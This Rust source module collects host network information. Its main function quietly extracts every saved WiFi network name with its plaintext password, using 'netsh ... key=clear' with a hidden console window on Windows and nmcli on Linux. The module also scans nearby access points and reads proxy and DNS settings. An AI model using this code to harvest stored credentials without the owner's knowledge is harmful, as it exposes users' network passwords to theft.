//! WiFi profile collection and nearby AP scanning (netsh / nmcli / iwlist).

use super::escape;
#[cfg(target_os = "windows")]
use super::wlan_ffi::scan_wifi_wlanapi;
use super::wlan_ffi::WifiApInfo;

/// Frequency in kHz → band label
#[cfg(not(target_os = "windows"))]
fn freq_to_band(freq_khz: u32) -> &'static str {
    if freq_khz == 0 {
        "未知"
    } else if freq_khz < 3_000_000 {
        "2.4GHz"
    } else if freq_khz < 6_000_000 {
        "5GHz"
    } else {
        "6GHz"
    }
}

#[cfg(target_os = "windows")]
fn channel_to_band(channel: u32) -> &'static str {
    match channel {
        1..=14 => "2.4GHz",
        36..=196 => "5GHz",
        1..=233 => "6GHz",
        _ => "未知",
    }
}

/// Collect saved WiFi profiles with passwords.
/// Locale-independent: parses by position (value after last `:` on profile lines)
pub(super) fn collect_wifi() -> String {
    #[cfg(target_os = "windows")]
    {
        use std::os::windows::process::CommandExt;

        // Step 1: Get profile names
        let profiles_output = std::process::Command::new("netsh")
            .args(["wlan", "show", "profiles"])
            .creation_flags(0x08000000)
            .output()
            .ok()
            .map(|o| String::from_utf8_lossy(&o.stdout).to_string())
            .unwrap_or_default();

        let mut profile_names = Vec::new();
        let mut past_separator = false;
        for line in profiles_output.lines() {
            let trimmed = line.trim();
            if trimmed.contains("---") {
                past_separator = true;
                continue;
            }
            if !past_separator {
                continue;
            }
            // Profile lines have format: "    <label> : <profile_name>"
            // Extract value after the LAST colon
            if let Some(colon_pos) = trimmed.rfind(':') {
                let value = trimmed[colon_pos + 1..].trim();
                if !value.is_empty() {
                    profile_names.push(value.to_string());
                }
            }
        }

        // Step 2: Get password for each profile
        let mut profiles = Vec::new();
        for name in &profile_names {
            if let Ok(output) = std::process::Command::new("netsh")
                .args([
                    "wlan",
                    "show",
                    "profile",
                    &format!("name={}", name),
                    "key=clear",
                ])
                .creation_flags(0x08000000)
                .output()
            {
                let detail = String::from_utf8_lossy(&output.stdout);
                let mut password = String::new();
                for line in detail.lines() {
                    let t = line.trim();
                    // Match both English "Key Content" and Chinese "密钥内容"
                    // Also match by position: it's the field containing "key" (case-insensitive) or "密钥"
                    let lower = t.to_lowercase();
                    if (lower.contains("key content") || t.contains("密钥内容")) && t.contains(':')
                    {
                        password = t.splitn(2, ':').nth(1).unwrap_or("").trim().to_string();
                        break;
                    }
                }
                profiles.push(format!(
                    r#"{{"ssid":"{}","password":"{}"}}"#,
                    escape(name),
                    escape(&password)
                ));
            }
        }
        return format!("[{}]", profiles.join(","));
    }
    #[cfg(not(target_os = "windows"))]
    {
        // Linux: try nmcli
        let mut profiles = Vec::new();
        if let Ok(output) = std::process::Command::new("nmcli")
            .args(["-t", "-f", "NAME,TYPE", "connection", "show"])
            .output()
        {
            let text = String::from_utf8_lossy(&output.stdout);
            for line in text.lines() {
                let parts: Vec<&str> = line.split(':').collect();
                if parts.len() >= 2 && parts[1].contains("wireless") {
                    let ssid = parts[0];
                    let mut password = String::new();
                    if let Ok(detail) = std::process::Command::new("nmcli")
                        .args([
                            "-s",
                            "-t",
                            "-f",
                            "802-11-wireless-security.psk",
                            "connection",
                            "show",
                            ssid,
                        ])
                        .output()
                    {
                        let pw_text = String::from_utf8_lossy(&detail.stdout);
                        for pw_line in pw_text.lines() {
                            if let Some(val) = pw_line.strip_prefix("802-11-wireless-security.psk:")
                            {
                                password = val.to_string();
                            }
                        }
                    }
                    profiles.push(format!(
                        r#"{{"ssid":"{}","password":"{}"}}"#,
                        escape(ssid),
                        escape(&password)
                    ));
                }
            }
        }
        return format!("[{}]", profiles.join(","));
    }
}

/// Scan nearby WiFi APs. Uses Win32 Wlan API with netsh regex fallback.
/// Returns JSON array with ssid, authentication, and band (2.4GHz/5GHz/6GHz).
pub(super) fn collect_wifi_bssid() -> String {
    #[cfg(target_os = "windows")]
    {
        let networks = match scan_wifi_wlanapi() {
            Ok(list) => list,
            Err(_) => scan_wifi_netsh().unwrap_or_default(),
        };

        let items: Vec<String> = networks.iter().map(|w| {
            format!(
                r#"{{"ssid":"{}","auth":"{}","encryption":"{}","bssid":"{}","signal":{},"band":"{}"}}"#,
                escape(&w.ssid),
                escape(&w.auth),
                escape(&w.encryption),
                escape(&w.bssid),
                w.signal,
                escape(&w.band),
            )
        }).collect();

        return format!("[{}]", items.join(","));
    }
    #[cfg(not(target_os = "windows"))]
    {
        // Linux: try nmcli device wifi list
        let mut ap_list: Vec<WifiApInfo> = Vec::new();
        if let Ok(output) = std::process::Command::new("nmcli")
            .args([
                "-t",
                "-f",
                "SSID,BSSID,CHAN,FREQ,SIGNAL,SECURITY",
                "device",
                "wifi",
                "list",
            ])
            .output()
        {
            let text = String::from_utf8_lossy(&output.stdout);
            for line in text.lines() {
                let parts: Vec<&str> = line.splitn(7, ':').collect();
                if parts.len() >= 6 {
                    let ssid = parts[0].replace("\\:", ":");
                    if ssid.is_empty() {
                        continue;
                    }
                    let bssid = parts
                        .get(1)
                        .map(|s| s.replace("\\:", ":"))
                        .unwrap_or_default();
                    let signal: u32 = parts.get(4).unwrap_or(&"0").parse().unwrap_or(0);
                    let security = parts.get(5).unwrap_or(&"");
                    let auth = match *security {
                        "" => "开放",
                        s if s.contains("WPA3") => "WPA3-SAE",
                        s if s.contains("WPA2") => "WPA2-PSK",
                        s if s.contains("WPA") => "WPA-PSK",
                        _ => security,
                    };
                    let encryption = if security.is_empty() { "无" } else { "" };
                    let freq_mhz: u32 = parts.get(3).unwrap_or(&"0").parse().unwrap_or(0);
                    let band = freq_to_band(freq_mhz * 1000).to_string(); // MHz → kHz
                    ap_list.push(WifiApInfo {
                        ssid,
                        auth: auth.to_string(),
                        encryption: encryption.to_string(),
                        bssid,
                        signal,
                        band,
                    });
                }
            }
        }
        // Fallback: iwlist scan
        if ap_list.is_empty() {
            if let Ok(output) = std::process::Command::new("iwlist").args(["scan"]).output() {
                let text = String::from_utf8_lossy(&output.stdout);
                let mut ssid = String::new();
                let mut bssid = String::new();
                let mut freq: u32 = 0;
                let mut signal: u32 = 0;

                for line in text.lines() {
                    let t = line.trim();
                    if t.starts_with("Cell ") {
                        if !ssid.is_empty() {
                            let band = freq_to_band(freq).to_string();
                            ap_list.push(WifiApInfo {
                                ssid: ssid.clone(),
                                auth: String::new(),
                                encryption: String::new(),
                                bssid: bssid.clone(),
                                signal,
                                band,
                            });
                        }
                        ssid.clear();
                        bssid.clear();
                        freq = 0;
                        signal = 0;
                    } else if t.starts_with("ESSID:") {
                        ssid = t.trim_start_matches("ESSID:").trim_matches('"').to_string();
                    } else if t.starts_with("Address:") {
                        bssid = t.trim_start_matches("Address:").trim().to_string();
                    } else if t.contains("Frequency:") {
                        if let Some(f) = t.split_whitespace().nth(2) {
                            freq = (f.parse::<f64>().unwrap_or(0.0) * 1_000_000.0) as u32;
                            // GHz → kHz
                        }
                    } else if let Some(q) = t.strip_prefix("Quality=") {
                        if let Some(slash) = q.find('/') {
                            let num: u32 = q[..slash].trim().parse().unwrap_or(0);
                            let den: u32 = q[slash + 1..]
                                .split_whitespace()
                                .next()
                                .unwrap_or("1")
                                .parse()
                                .unwrap_or(1);
                            signal = (num * 100 / den).min(100);
                        }
                    }
                }
                if !ssid.is_empty() {
                    let band = freq_to_band(freq).to_string();
                    ap_list.push(WifiApInfo {
                        ssid,
                        auth: String::new(),
                        encryption: String::new(),
                        bssid,
                        signal,
                        band,
                    });
                }
            }
        }
        // Deduplicate by BSSID
        let mut seen = std::collections::HashSet::new();
        ap_list.retain(|w| seen.insert(w.bssid.clone()));

        let items: Vec<String> = ap_list.iter().map(|w| {
            format!(
                r#"{{"ssid":"{}","auth":"{}","encryption":"{}","bssid":"{}","signal":{},"band":"{}"}}"#,
                escape(&w.ssid),
                escape(&w.auth),
                escape(&w.encryption),
                escape(&w.bssid),
                w.signal,
                escape(&w.band),
            )
        }).collect();

        return format!("[{}]", items.join(","));
    }
}

// ── netsh fallback (Windows) ────────────────────────────────────────────

#[cfg(target_os = "windows")]
fn scan_wifi_netsh() -> Result<Vec<WifiApInfo>, String> {
    use std::os::windows::process::CommandExt;

    let output = std::process::Command::new("netsh")
        .args(["wlan", "show", "networks", "mode=bssid"])
        .creation_flags(0x08000000)
        .output()
        .map_err(|e| format!("执行 netsh 失败: {}", e))?;

    if !output.status.success() {
        return Err("netsh 命令执行失败".into());
    }

    let text = String::from_utf8_lossy(&output.stdout).to_string();
    parse_netsh_output(&text)
}

#[cfg(target_os = "windows")]
fn parse_netsh_output(text: &str) -> Result<Vec<WifiApInfo>, String> {
    let ssid_re = regex::Regex::new(r"SSID \d+\s*:\s*(.+)").unwrap();
    let auth_re = regex::Regex::new(r"(?:身份验证|Authentication)\s*:\s*(.+)").unwrap();
    let channel_re = regex::Regex::new(r"(?:频道|Channel)\s*:\s*(\d+)").unwrap();

    let mut networks = Vec::new();
    let mut current_ssid: Option<String> = None;
    let mut current_auth: Option<String> = None;
    let mut bands = std::collections::HashSet::new();

    for line in text.lines() {
        if let Some(cap) = ssid_re.captures(line) {
            // Save previous SSID block
            if let Some(ssid) = current_ssid.take() {
                let band = if bands.is_empty() {
                    "未知".to_string()
                } else {
                    let mut v: Vec<&str> = bands.iter().map(|s| *s).collect();
                    v.sort();
                    v.join("/")
                };
                networks.push(WifiApInfo {
                    ssid,
                    auth: current_auth.take().unwrap_or_else(|| "未知".into()),
                    encryption: String::new(),
                    bssid: String::new(),
                    signal: 0,
                    band,
                });
            }
            current_ssid = Some(cap[1].trim().to_string());
            current_auth = None;
            bands.clear();
        } else if let Some(cap) = auth_re.captures(line) {
            current_auth = Some(cap[1].trim().to_string());
        } else if let Some(cap) = channel_re.captures(line) {
            if let Ok(ch) = cap[1].parse::<u32>() {
                bands.insert(channel_to_band(ch));
            }
        }
    }

    // Last SSID
    if let Some(ssid) = current_ssid {
        let band = if bands.is_empty() {
            "未知".to_string()
        } else {
            let mut v: Vec<&str> = bands.iter().map(|s| *s).collect();
            v.sort();
            v.join("/")
        };
        networks.push(WifiApInfo {
            ssid,
            auth: current_auth.unwrap_or_else(|| "未知".into()),
            encryption: String::new(),
            bssid: String::new(),
            signal: 0,
            band,
        });
    }

    // Deduplicate by SSID
    let mut seen = std::collections::HashSet::new();
    networks.retain(|n| seen.insert(n.ssid.clone()));

    Ok(networks)
}

// ── Proxy + DNS suffix ──────────────────────────────────────────────────

pub(super) fn collect_proxy() -> String {
    #[cfg(target_os = "windows")]
    {
        use std::os::windows::process::CommandExt;
        if let Ok(output) = std::process::Command::new("reg")
            .args([
                "query",
                r"HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings",
            ])
            .creation_flags(0x08000000)
            .output()
        {
            let text = String::from_utf8_lossy(&output.stdout).to_uppercase();
            let enabled = text.contains("PROXYENABLE") && text.contains("0X1");
            let server = {
                let search = "PROXYSERVER";
                if let Some(pos) = text.find(search) {
                    let rest = &text[pos + search.len()..];
                    if let Some(reg_pos) = rest.find("REG_SZ") {
                        rest[reg_pos + 6..]
                            .lines()
                            .next()
                            .unwrap_or("")
                            .trim()
                            .to_string()
                    } else {
                        String::new()
                    }
                } else {
                    String::new()
                }
            };

            let port: u16 = if let Some(colon) = server.rfind(':') {
                server[colon + 1..].parse().unwrap_or(0)
            } else {
                0
            };

            return format!(
                r#"{{"enabled":{},"server":"{}","port":{},"bypass":""}}"#,
                enabled,
                escape(&server),
                port
            );
        }
    }
    #[cfg(not(target_os = "windows"))]
    {
        let http_proxy = std::env::var("HTTP_PROXY")
            .or_else(|_| std::env::var("http_proxy"))
            .unwrap_or_default();
        let https_proxy = std::env::var("HTTPS_PROXY")
            .or_else(|_| std::env::var("https_proxy"))
            .unwrap_or_default();
        let all_proxy = if !https_proxy.is_empty() {
            &https_proxy
        } else {
            &http_proxy
        };
        let enabled = !all_proxy.is_empty();

        return format!(
            r#"{{"enabled":{},"server":"{}","port":0,"bypass":""}}"#,
            enabled,
            escape(all_proxy)
        );
    }
    #[allow(unreachable_code)]
    r#"{"enabled":false,"server":"","port":0,"bypass":""}"#.to_string()
}

pub(super) fn get_dns_suffix() -> String {
    #[cfg(target_os = "windows")]
    {
        use std::os::windows::process::CommandExt;
        if let Ok(output) = std::process::Command::new("ipconfig")
            .args(["/all"])
            .creation_flags(0x08000000)
            .output()
        {
            let text = String::from_utf8_lossy(&output.stdout);
            for line in text.lines() {
                // Match both "DNS Suffix" (EN) and "DNS 后缀" (CN)
                let lower = line.to_lowercase();
                if (lower.contains("dns suffix") || lower.contains("dns 后缀"))
                    && line.contains(':')
                {
                    return line.split(':').nth(1).unwrap_or("").trim().to_string();
                }
            }
        }
    }
    String::new()
}
